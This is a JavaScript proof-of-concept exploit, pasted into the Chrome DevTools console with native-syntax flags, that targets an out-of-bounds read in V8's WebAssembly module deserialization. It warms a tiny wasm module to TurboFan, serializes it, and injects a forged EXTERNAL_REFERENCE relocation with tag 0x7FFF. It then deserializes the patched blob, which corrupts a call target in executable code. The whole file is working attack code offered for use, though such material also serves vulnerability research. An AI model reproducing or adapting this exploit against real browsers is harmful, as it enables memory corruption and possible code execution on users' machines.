// CWE-129 OOB read — browser DevTools console version
// Paste into DevTools console (Chrome with --js-flags="--allow-natives-syntax --no-liftoff")

poc: {

const WASM = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
  0x01,0x05, 0x01,0x60, 0x00,0x01,0x7f,
  0x03,0x02, 0x01,0x00,
  0x07,0x05, 0x01,0x01, 0x66,0x00,0x00,
  0x0a,0x06, 0x01,0x04, 0x00,0x41,0x2a,0x0b,
]);

// Step 1: compile + warm to TurboFan
console.log('[1] Compiling and warming to TurboFan...');
const mod  = new WebAssembly.Module(WASM);
const inst = new WebAssembly.Instance(mod);
for (let i = 0; i < 200000; i++) inst.exports.f();
console.log('    f() = ' + inst.exports.f());

// Step 2: serialize (eval defers % parse to runtime)
let blob;
try {
  blob = eval('%SerializeWasmModule(mod)');
} catch (e) {
  console.error('[!] %SerializeWasmModule failed: ' + e);
  console.error('    Launch Chrome: google-chrome --js-flags="--allow-natives-syntax --no-liftoff"');
  break poc;
}
if (!blob) { console.error('[!] null blob'); break poc; }

const bv = new Uint8Array(blob);
const dv = new DataView(blob);
console.log('[2] Blob: ' + blob.byteLength + 'B');

// Step 3: parse blob
const f0         = 29;
const code_kind  = bv[f0];
const code_size  = dv.getUint32(f0 + 29, true);
const reloc_size = dv.getUint32(f0 + 33, true);
const tier       = bv[f0 + 53];
const code_start = f0 + 54;
const reloc_start = code_start + code_size;

console.log('[3] func0: code_kind=0x' + code_kind.toString(16) +
            ' tier=0x' + tier.toString(16) +
            ' code_size=' + code_size + ' reloc_size=' + reloc_size);

if (tier !== 0x02) {
  console.error('[!] Not TurboFan — relaunch with --no-liftoff');
  break poc;
}

// Step 4: craft patched blob
// Inject EXTERNAL_REFERENCE reloc [pc_delta=8, mode=0x2F=(11<<2)|3]
// GetWasmCalleeTag reads code[8..11] = 0x7FFF → address_from_tag(0x7FFF) → OOB
const PC_DELTA = 8, OOB_TAG = 0x7FFF;
const patched = blob.slice(0);
const pv = new Uint8Array(patched);
const pd = new DataView(patched);

pv[reloc_start]     = PC_DELTA;
pv[reloc_start + 1] = (11 << 2) | 3;  // 0x2F  EXTERNAL_REFERENCE mode byte

const tag_abs = code_start + PC_DELTA;
const orig = [...bv.slice(tag_abs, tag_abs+4)].map(b=>b.toString(16).padStart(2,'0')).join(' ');
pd.setUint32(tag_abs, OOB_TAG, true);
const patc = [...pv.slice(tag_abs, tag_abs+4)].map(b=>b.toString(16).padStart(2,'0')).join(' ');
console.log('[4] code[8..+3]: ' + orig + ' → ' + patc + '  (OOB_TAG=0x7fff)');

if (2 !== reloc_size) pd.setUint32(f0 + 33, 2, true);

// Step 5: deserialize → triggers vulnerable path
console.log('[5] DeserializeWasmModule → address_from_tag(0x7FFF) ...');
let poisoned_mod;
try {
  poisoned_mod = eval('%DeserializeWasmModule(patched, WASM)');
} catch (e) {
  console.log('[EXCEPTION] ' + e);
  if (/Check failed|DCHECK|FATAL/.test(String(e))) {
    console.log('%c[DEBUG BUILD] DCHECK_GT(kNumExternalReferences,0x7FFF) FIRED', 'color:orange;font-weight:bold');
    console.log('  wasm-serialization.cc:287 — guard present in debug, absent in release');
  } else {
    console.log('  crash on OOB read / hijacked call target (release build)');
  }
  break poc;
}

if (poisoned_mod) {
  console.log('%c[RELEASE BUILD] OOB READ + WRITE EXECUTED', 'color:red;font-weight:bold');
  console.log('  external_reference_by_tag_[0x7FFF] read (~256KB OOB)');
  console.log('  .bss Address written to executable code as call target');
  try {
    const pi = new WebAssembly.Instance(poisoned_mod);
    console.log('  poisoned f() = ' + pi.exports.f() + '  (code[8..15] corrupted)');
  } catch (ce) {
    console.log('  [CRASH on call] ' + ce.message);
  }
}

} // end poc:
